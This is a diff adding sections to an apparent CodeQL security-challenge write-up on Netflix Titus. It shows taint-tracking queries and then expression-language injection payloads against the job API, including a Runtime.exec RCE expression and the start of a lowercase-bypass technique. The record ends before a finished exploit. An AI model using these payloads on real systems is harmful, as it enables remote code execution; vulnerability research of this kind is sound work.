@@ -166,4 +166,159 @@ In the output, we see that flow stops at the return statement of the getters lik
 
 As we see in the last step, the code doesn't propagate through the getters. My best bet why this happens is because getters not always point to tainted data. They often point to some static variables, which are not tainted.
 
+### 1.6 Adding additional taint steps
+
+We need to step through the getters as explained in the last step. For this, we add an addition step where we step from a method access to it's qualifier. As suggested in the challenge, we extend `TaintTracking::AdditionalTaintStep`.
+
+```codeql
+class StepThroughGetters extends TaintTracking::AdditionalTaintStep {
+
+  override predicate step(DataFlow::Node pred, DataFlow::Node succ) {
+    exists(MethodAccess ma, GetterMethod m |
+        succ.asExpr() = ma and
+        pred.asExpr() = ma.getQualifier() and
+        ma.getCallee() = m
+    )
+  }
+}
+
+```
+We restrict our step only through the getter methods, not through general methods. This time, the flow stops at the HashSet Constructor. But in the output we see that
+
+![](/images/1.6.1.png)
+
+We don't step through `keySet()` method. So we must step through all the methods.
+
+```codeql
+class StepThroughGetters extends TaintTracking::AdditionalTaintStep {
+
+  override predicate step(DataFlow::Node pred, DataFlow::Node succ) {
+    exists(MethodAccess ma|
+        succ.asExpr() = ma and
+        pred.asExpr() = ma.getQualifier()
+    )
+  }
+}
+
+```
+
+![](/images/1.6.2.png)
+
+We pass through all the method invocations of any object now.
+
+### 1.7 Adding taint steps through a constructor
+
+We just join the two conditions, i.e. through getters and through constructors.
+
+```codeql
+class StepThroughGetters extends TaintTracking::AdditionalTaintStep {
+
+  override predicate step(DataFlow::Node pred, DataFlow::Node succ) {
+    exists(MethodAccess ma |
+        succ.asExpr() = ma and
+        pred.asExpr() = ma.getQualifier()
+    ) or
+    exists(ConstructorCall ma |
+        succ.asExpr() = ma and
+        ma.getArgument(0) = pred.asExpr()
+    )
+  }
+}
+
+```
+
+
+Hurray :tada:! We reached our final destination function. We have fixed the steps for the `SchedulingConstraintSetValidator.java` file. Other files to go!
+
+### Step 2: Second Issue
+
+### Step 3: Errors and Exceptions
+
+### Step 4: Exploit and Remedition
+
+First step towards a successful exploit is setting up a development environment. I set up the project on Docker using the `docker-compose.yml` and tweaked the Dockerfiles to fire up debugging in IntelliJ IDEA.
+
+First glance at the files `SchedulingConstraintValidator.java` and `SchedulingConstraintSetValidator.java` suggest that the keys of the dictonaries are passed into the template builder function. That's were our EL expression will go.
+
+A neat data model for Titus can be found [here](https://github.com/Netflix/titus-api-definitions/blob/master/doc/Titus_v3_data_model.png). It clearly shows that `softConstraints` and `hardConstraints` are inside the class `Container` and an instance of class is made under `JobDescriptor`. So, I make a reasonable guess that we can tweak the JobDescriptor object while creating a job to get an RCE. In the main readme file of titus-control-plane, under the section ([here](https://github.com/Netflix/titus-control-plane#local-testing-with-docker-compose)) they have provided the basic curl request to submit a job. We need to just add the keys `softConstraints` and `hardConstraints` to the data payload. A very basic payload should be:
+
+```json
+{
+    "applicationName": "myApp",
+    "owner": {
+        "teamEmail": "kanav0610@gmail.com"
+    },
+    "container": {
+        "resources": {
+            "cpu": 1,
+            "memoryMB": 128,
+            "diskMB": 128,
+            "networkMbps": 1
+        },
+        "securityProfile": {"iamRole": "test-role", "securityGroups": ["sg-test"]},
+        "image": {
+            "name": "ubuntu",
+            "tag": "xenial"
+        },
+        "softConstraints": {
+            "constraints": {
+                "#{6*9}": "lol"
+            }
+        },
+        "hardConstraints": {
+            "constraints": {
+                "#{6*9}": "lol"
+            }
+        }
+    },
+    "service": {
+        "capacity": {
+            "min": 1,
+            "max": 1,
+            "desired": 1
+        },
+        "retryPolicy": {
+            "immediate": {
+                "retries": 10
+            }
+        }
+    }
+}
+```
+
+We see a successful response -
+```json
+{
+    "statusCode": 400,
+    "message": "Invalid Argument: {Validation failed: 'field: 'container.softConstraints', description: 'Unrecognized constraints [54]', type: 'HARD''}, {Validation failed: 'field: 'container.hardConstraints', description: 'Unrecognized constraints [54]', type: 'HARD''}, {Validation failed: 'field: 'container', description: 'Soft and hard constraints not unique. Shared constraints: [54]', type: 'HARD''}"
+}
+```
+
+Things get interesting when we send an actual exploit, i.e we send the EL Expression `#{''.class.forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js').eval('java.lang.Runtime.getRuntime().exec("touch /tmp/hello")')}`
+
+```json
+{
+    "statusCode": 500,
+    "message": "Unexpected error: HV000149: An exception occurred during message interpolation"
+}
+```
+
+We open our debugger, and we find that when creating a job, first individual constraints are validated (using `isValid` function in `SchedulingConstraintValidator.java` file) to see if valid keys are sent, then validation for the complete set is done to see if both constraint sets dont contain anything common.
+
+As the validation is done inside `SchedulingConstraintValidator.java` file first, we see that in the `isValid` function:
+
+```java
+Set<String> namesInLowerCase = value.keySet().stream().map(String::toLowerCase).collect(Collectors.toSet());
+```
+
+This is why we get 500. The complete EL expression is converted to lowercase, i.e 
+`#{''.class.forname('javax.script.scriptenginemanager').newinstance().getenginebyname('js').eval('java.lang.runtime.getruntime().exec("touch /tmp/hello")')}`
+which should obviously error because Java doesn't know any class by name "javax.script.scriptenginemanager".
+
+So we now need to forge an EL expression such that all the letters in the code are in lowercase (which is tough, because Java inherently uses camel-case).
+
+For achieving this, we use `a.class.methods[*].invoke(a, args...)` to invoke any method, instead of invoking them by `a.methodCanContainCapitalLetters(args...)`. Only thing we need to do is to find at what index of `a.class.methods` does the function we need lie.
+
+
+
 
